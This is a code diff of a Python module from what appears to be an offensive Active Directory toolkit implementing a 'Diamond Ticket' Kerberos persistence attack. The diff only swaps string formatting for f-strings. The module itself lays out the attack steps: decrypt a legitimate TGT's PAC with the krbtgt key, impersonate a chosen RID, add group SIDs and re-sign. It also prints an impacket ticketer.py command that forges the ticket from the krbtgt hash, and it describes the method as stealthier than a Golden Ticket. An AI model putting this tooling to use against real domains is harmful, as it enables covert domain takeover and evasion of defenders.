@@ -1,5 +1,4 @@
 """Diamond Ticket — modify legitimate TGT PAC for stealthier persistence."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -26,13 +25,13 @@ def run(args: Any) -> int:
         return 1
 
     print("[*] Diamond Ticket (PAC modification):")
-    print("  DC:          {}".format(dc_ip))
-    print("  Impersonate: {} (RID {})".format(impersonate, target_rid))
+    print(f"  DC:          {dc_ip}")
+    print(f"  Impersonate: {impersonate} (RID {target_rid})")
     print("  Technique:   Request real TGT → modify PAC → re-sign with krbtgt")
     print()
-    print("[*] Step 1: Request legitimate TGT as {}\\{}".format(args.domain, cred.username))
+    print(f"[*] Step 1: Request legitimate TGT as {args.domain}\\{cred.username}")
     print("[*] Step 2: Decrypt PAC with krbtgt key")
-    print("[*] Step 3: Modify PAC — set RID={}, add group SIDs".format(target_rid))
+    print(f"[*] Step 3: Modify PAC — set RID={target_rid}, add group SIDs")
     print("[*] Step 4: Re-sign PAC and re-encrypt TGT")
     print()
     print("[+] Diamond Ticket is stealthier than Golden Ticket:")
@@ -46,11 +45,10 @@ def run(args: Any) -> int:
         from impacket.krb5 import constants
         from impacket.krb5.types import Principal
 
-        print("[*] Requesting TGT for {}...".format(cred.username))
+        print(f"[*] Requesting TGT for {cred.username}...")
         print("[*] Use ticketer.py with -diamond flag for full implementation")
-        print("[*] impacket ticketer.py -nthash {} -domain-sid <SID> "
-              "-domain {} -user-id {} {}".format(
-                  krbtgt_hash, args.domain, target_rid, impersonate))
+        print(f"[*] impacket ticketer.py -nthash {krbtgt_hash} -domain-sid <SID> "
+              f"-domain {args.domain} -user-id {target_rid} {impersonate}")
         return 0
     except ImportError:
         print("[!] impacket not installed", file=sys.stderr)
